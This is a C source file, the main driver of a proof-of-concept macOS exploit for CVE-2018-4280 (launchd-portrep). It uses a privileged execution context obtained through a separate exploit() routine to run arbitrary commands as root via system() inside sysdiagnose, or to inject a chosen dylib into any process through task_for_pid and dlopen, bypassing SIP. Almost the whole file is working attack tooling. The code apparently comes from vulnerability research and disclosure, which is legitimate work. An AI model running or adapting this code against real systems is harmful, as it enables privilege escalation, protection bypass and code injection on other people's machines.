/*
 * launchd-portrep
 * Brandon Azad
 *
 * CVE-2018-4280
 *
 *
 * launchd-portrep
 * ================================================================================================
 *
 *  See launchd-portrep.c.
 *
 *
 * The vulnerability
 * ------------------------------------------------------------------------------------------------
 *
 *  See launchd-portrep.c.
 *
 *
 * Exploit strategy to get task_for_pid-allow
 * ------------------------------------------------------------------------------------------------
 *
 *  See exploit.c.
 *
 *
 * Once we have task_for_pid-allow
 * ------------------------------------------------------------------------------------------------
 *
 *  Once we have code execution inside a task_for_pid-allow process, we can control any task on the
 *  system. This is great because not only can we perform the standard elevation of privileges, but
 *  we can also bypass SIP by injecting code into SIP-entitled processes.
 *
 *  This exploit demonstrates two potential uses: system command execution as root and dylib
 *  injection. To execute a system command, we simply invoke the standard system() function from
 *  within sysdiagnose, passing it the command string supplied by the user. To inject a dylib into
 *  a process, we call task_for_pid() from within sysdiagnose to get the task port of the target,
 *  then use the task port to call dlopen() on the supplied library.
 *
 */

#include "exploit.h"
#include "log.h"

#include <dlfcn.h>
#include <mach/mach.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// A log function to print the message to stdout in classic hacker style.
static void
log(char type, const char *format, va_list ap) {
	switch (type) {
		case 'I': type = '+'; break;
		case 'W': type = '!'; break;
		case 'E': type = '-'; break;
	}
	char *msg = NULL;
	vasprintf(&msg, format, ap);
	printf("[%c] %s\n", type, msg);
	free(msg);
}

// Parse the program arguments.
static bool
parse_arguments(int argc, const char *argv[],
		const char **system_command, pid_t *target_pid, const char **dylib_path) {
	if (argc == 2) {
		*system_command = argv[1];
	} else if (argc == 3) {
		char *end;
		*target_pid = strtoul(argv[1], &end, 0);
		if (*end != 0) {
			goto usage;
		}
		*dylib_path = argv[2];
	} else {
usage:
		printf("Usage: %1$s <command-string>\n"
		       "  Executes \"system(<command-string>)\" from a root process\n"
		       "Usage: %1$s <pid> <path-to-dylib>\n"
		       "  Injects the dynamic library <path-to-dylib> into process <pid>\n",
		       argv[0]);
		return false;
	}
	return true;
}

// Run the specified command string inside sysdiagnose.
static bool
run_system_command(threadexec_t priv_tx, const char *system_command) {
	int ret;
	bool ok = threadexec_call_cv(priv_tx, &ret, sizeof(ret),
			system, 1,
			TX_CARG_CSTRING(const char *, system_command));
	if (!ok) {
		ERROR("Could not execute command in privileged process");
		return false;
	}
	INFO("Command exited with status: %d", ret);
	return true;
}

// Inject a dynamic library into the specified process.
static bool
inject_dylib(threadexec_t priv_tx, pid_t target_pid, const char *dylib_path) {
	bool success = false;
	// Get the task port of the specified process.
	mach_port_t target_task;
	bool ok = threadexec_task_for_pid(priv_tx, target_pid, &target_task);
	if (!ok) {
		ERROR("Could not get task port for PID %d", target_pid);
		goto fail_0;
	}
	INFO("Got task port 0x%x for PID %d", target_task, target_pid);
	// Create an execution context in the target.
	threadexec_t target_tx = threadexec_init(target_task, MACH_PORT_NULL, 0);
	if (target_tx == NULL) {
		ERROR("Could not create execution context in PID %d", target_pid);
		mach_port_deallocate(mach_task_self(), target_task);
		goto fail_0;
	}
	DEBUG_TRACE(2, "Created execution context in PID %d", target_pid);
	// Call dlopen(dylib_path, RTLD_NOW) in the target.
	void *handle;
	ok = threadexec_call_cv(target_tx, &handle, sizeof(handle),
			dlopen, 2,
			TX_CARG_CSTRING(const char *, dylib_path),
			TX_CARG_LITERAL(int,          RTLD_NOW));
	if (!ok) {
		ERROR("Could not call dlopen(\"%s\") in process %d", dylib_path, target_pid);
		goto fail_1;
	}
	if (handle == NULL) {
		ERROR("Call dlopen(\"%s\") in process %d failed", dylib_path, target_pid);
		goto fail_1;
	}
	INFO("Successfully loaded \"%s\" in process %d", dylib_path, target_pid);
	success = true;
fail_1:
	// Destroy the execution context in the target.
	threadexec_deinit(target_tx);
fail_0:
	return success;
}

int
main(int argc, const char *argv[]) {
	log_implementation = log;
	// Parse the arguments.
	const char *system_command = NULL;
	pid_t target_pid = -1;
	const char *dylib_path = NULL;
	bool success = parse_arguments(argc, argv, &system_command, &target_pid, &dylib_path);
	if (!success) {
		return 1;
	}
	// Run the exploit to get an execution context in a privileged process.
	threadexec_t priv_tx = exploit();
	if (priv_tx == NULL) {
		return 1;
	}
	// Perform the requested action.
	if (system_command != NULL) {
		success = run_system_command(priv_tx, system_command);
	} else if (dylib_path != NULL) {
		success = inject_dylib(priv_tx, target_pid, dylib_path);
	}
	// Deallocate the threadexec. This will also kill the process.
	threadexec_deinit(priv_tx);
	return (success ? 0 : 1);
}
